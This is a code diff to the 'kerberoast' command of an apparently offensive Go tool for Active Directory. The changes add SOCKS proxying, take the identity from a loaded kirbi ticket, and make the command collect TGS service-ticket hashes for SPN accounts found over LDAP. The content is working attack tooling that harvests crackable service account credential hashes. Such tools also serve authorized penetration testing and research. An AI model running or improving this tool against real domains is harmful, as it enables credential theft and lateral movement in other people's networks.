@@ -29,14 +29,43 @@ func init() {
 	var key string
 	var spn string
 	var outputFile string
+	var socks string
 
 	var kerberoastCmd = &cobra.Command{
 		Use:   "kerberoast",
 		Short: "Perform a Kerberoasting attack against specified user(s)",
 		Long:  `Perform a Kerberoasting attack against specified user(s)`,
 		PreRunE: func(cmd *cobra.Command, args []string) error {
-			if err := validateDomainUserFlagsWithTicket(username, password, key, ticket); err != nil {
+			if err := validateETypeFlag(enctype); err != nil {
 				return err
+			}
+
+			// Get username and domain from TGT
+			// TODO: improve check
+			if len(ticket) > 0 {
+				kirbi, err := krb5.NewKrbCredFromFile(ticket)
+				if err != nil {
+					return fmt.Errorf("cannot load kirbi: %s", err)
+				}
+
+				if len(username) == 0 {
+					username = kirbi.UserName()
+				}
+
+				if len(domain) == 0 {
+					domain = kirbi.UserRealm()
+				}
+
+				eType := getETypeFromFlagValue(enctype)
+				if eType != kirbi.EType() {
+					fmt.Printf("[!] The ticket use an encryption type %d and you set %d\n", kirbi.EType(), eType)
+				}
+
+				// TODO: check EncType
+			} else {
+				if err := validateDomainUserFlagsWithTicket(username, password, key, ticket); err != nil {
+					return err
+				}
 			}
 
 			if err := validateETypeFlag(enctype); err != nil {
@@ -69,6 +98,11 @@ func init() {
 		RunE: func(cmd *cobra.Command, args []string) error {
 			printDomainInformation(domain, dcIp)
 
+			dialer, err := getKdcDialer(socks)
+			if err != nil {
+				return fmt.Errorf("Cannot create SOCKS client: %s", err)
+			}
+
 			var tgtCred *krb5.KRBCred
 			targets := make([]spnTarget, 0)
 
@@ -81,14 +115,13 @@ func init() {
 
 				tgtCred = kirbi
 			} else {
-				fmt.Printf("[*] Use LDAP to retreive vulnerable accounts\n")
 				keyBytes, err := getKeyFlagValue(key)
 				if err != nil {
 					return err
 				}
 
 				fmt.Printf("[*] Use username and password/key as credentials to request a TGT\n")
-				tgt, err := krb5.AskTGT(domain, username, password, keyBytes, getETypeFromFlagValue(enctype), dcIp, false, false)
+				tgt, err := krb5.AskTGT(dialer, domain, username, password, keyBytes, getETypeFromFlagValue(enctype), dcIp, false, false)
 				if err != nil {
 					return fmt.Errorf("cannot ask TGT: %s", err)
 				}
@@ -100,13 +133,14 @@ func init() {
 				fmt.Printf("[*] Keberoast SPN %s\n", spn)
 				targets = append(targets, spnTarget{username: "USER", spn: spn})
 			} else if useLdap {
+				fmt.Printf("[*] Use LDAP to retreive vulnerable accounts\n")
 				ldapClient, err := ldap.NewLDAPClient()
 				if err != nil {
 					return err
 				}
 
 				// TODO : support LDAPS
-				if err := ldapClient.Connect(dcIp, 389); err != nil {
+				if err := ldapClient.Connect(dcIp, 389, false); err != nil {
 					return err
 				}
 				defer ldapClient.Close()
@@ -141,19 +175,25 @@ func init() {
 
 			hashes := ""
 			for _, target := range targets {
-				// TODO: compute the correct NameType and NamString
+				// TODO: compute the correct NameType and NameString
 				principalName := krb5.PrincipalName{
-					NameType:   krb5.KRB_NT_SRV_INST,
+					NameType:   krb5.KRB_NT_MS_PRINCIPAL,
 					NameString: strings.Split(target.spn, "/"),
 				}
 
 				fmt.Printf("[*] Asking TGS for principal: %s\n", target.spn)
-				tgs, err := krb5.AskTGSWithKirbi(domain, principalName, tgtCred, dcIp)
+				tgs, err := krb5.AskTGSWithKirbi(dialer, domain, principalName, tgtCred, dcIp)
 				if err != nil {
-					fmt.Printf("Cannot ask TGS for principal %s: %s", target.spn, err)
+					msg := fmt.Sprintf("Cannot ask TGS for principal %s: %s", target.spn, err)
+					if len(targets) == 1 {
+						return fmt.Errorf("%s", msg)
+					} else {
+						fmt.Printf("[!] %s\n", msg)
+					}
+				} else {
+					hashes += fmt.Sprintf("%s\n", tgs.HashString(target.username, target.spn))
+					fmt.Printf("%s\n", tgs)
 				}
-
-				hashes += fmt.Sprintf("%s\n", tgs.HashString(target.username, target.spn))
 			}
 
 			if len(outputFile) == 0 {
@@ -173,8 +213,8 @@ func init() {
 		},
 	}
 
-	commandAddKerberosDomainFlags(kerberoastCmd, &domain, &dcIp)
-	commandAddDomainUserFlagsWithTicket(kerberoastCmd, &username, &password, &key, &ticket)
+	commandAddKerberosDomainFlags(kerberoastCmd, &dcIp, &socks)
+	commandAddDomainUserFlagsWithTicket(kerberoastCmd, &domain, &username, &password, &key, &ticket)
 	kerberoastCmd.Flags().BoolVarP(&useLdap, "ldap", "l", false, "Search targets on LDAP with username and password")
 	commandAddLDAPFlags(kerberoastCmd, &ldapUser, &ldapPassword, &ldapSizeLimit)
 	commandAddKerberosETypeFlagWithDefaultValue(kerberoastCmd, &enctype, "rc4")
